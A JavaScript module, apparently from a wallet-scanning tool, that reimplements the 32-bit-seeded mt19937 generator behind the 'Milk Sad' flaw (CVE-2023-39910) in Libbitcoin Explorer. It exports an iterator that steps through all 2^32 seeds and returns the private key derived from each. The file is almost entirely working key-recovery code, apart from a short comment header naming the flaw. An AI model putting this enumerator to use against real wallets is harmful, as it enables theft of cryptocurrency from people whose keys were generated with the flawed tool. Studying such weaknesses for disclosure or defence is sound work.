// Libbitcoin Explorer "Milk Sad" vulnerability (CVE-2023-39910, August 2023)
// The `bx seed` command seeded mt19937 (32-bit) with nanoseconds-since-epoch
// cast to uint32_t — giving only 2^32 possible outputs regardless of bit length.
// Documented in Andreas Antonopoulos's "Mastering Bitcoin" tutorial.
// Exploited in the wild June–July 2023. Reference: https://milksad.info

const N = 624, M = 397;
const MATRIX_A  = 0x9908b0df;
const UPPER_MASK = 0x80000000;
const LOWER_MASK = 0x7fffffff;

function mt32Key(seed32) {
  const mt = new Uint32Array(N);
  mt[0] = seed32 >>> 0;
  for (let i = 1; i < N; i++) {
    mt[i] = (Math.imul(1812433253, mt[i - 1] ^ (mt[i - 1] >>> 30)) + i) >>> 0;
  }

  // Twist
  for (let kk = 0; kk < N - M; kk++) {
    const y = (mt[kk] & UPPER_MASK) | (mt[kk + 1] & LOWER_MASK);
    mt[kk] = mt[kk + M] ^ (y >>> 1) ^ (y & 1 ? MATRIX_A : 0);
  }
  for (let kk = N - M; kk < N - 1; kk++) {
    const y = (mt[kk] & UPPER_MASK) | (mt[kk + 1] & LOWER_MASK);
    mt[kk] = mt[kk + (M - N)] ^ (y >>> 1) ^ (y & 1 ? MATRIX_A : 0);
  }
  {
    const y = (mt[N - 1] & UPPER_MASK) | (mt[0] & LOWER_MASK);
    mt[N - 1] = mt[M - 1] ^ (y >>> 1) ^ (y & 1 ? MATRIX_A : 0);
  }

  // Extract first 8 tempered outputs → 32 bytes → private key (big-endian)
  const key = new Uint8Array(32);
  for (let i = 0; i < 8; i++) {
    let y = mt[i];
    y ^= (y >>> 11);
    y ^= (y << 7)  & 0x9d2c5680;
    y ^= (y << 15) & 0xefc60000;
    y ^= (y >>> 18);
    y = y >>> 0;
    key[i * 4]     = (y >>> 24) & 0xff;
    key[i * 4 + 1] = (y >>> 16) & 0xff;
    key[i * 4 + 2] = (y >>> 8)  & 0xff;
    key[i * 4 + 3] =  y         & 0xff;
  }
  return key;
}

let _seed = 0;

export function resetLibbitcoin(startSeed = 0) { _seed = startSeed >>> 0; }
export function getLibbitcoinSeed() { return _seed; }
export function libbitcoinTotal() { return 0x100000000; }

export function nextLibbitcoinKey() {
  if (_seed >= 0x100000000) return { key: null, seed: _seed, exhausted: true };
  const seed = _seed++;
  return { key: mt32Key(seed), seed, exhausted: false };
}
